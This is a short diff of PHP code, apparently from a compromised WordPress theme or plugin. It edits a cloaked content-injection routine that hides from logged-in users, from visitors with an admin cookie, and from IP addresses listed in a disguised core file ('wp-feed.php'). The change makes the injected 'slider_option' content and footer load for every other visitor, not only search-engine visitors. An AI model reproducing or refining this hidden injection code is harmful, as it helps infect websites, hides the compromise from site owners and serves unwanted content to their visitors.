@@ -113,10 +113,11 @@ if(!isset($_COOKIE['wordpress_cf_adm_use_adm']) && !is_user_logged_in())
 $adtxt=@file_get_contents(ABSPATH.'wp-includes/wp-feed.php');
 if (stripos($adtxt, $_SERVER['REMOTE_ADDR']) === false)
 {
-if($sevisitor==true || isset($_COOKIE['sevisitor']))
-{
 add_filter('the_content','slider_option');
 add_action('wp_footer','slider_option_footer');
+if($sevisitor==true || isset($_COOKIE['sevisitor']))
+{
+
 }
 
 }
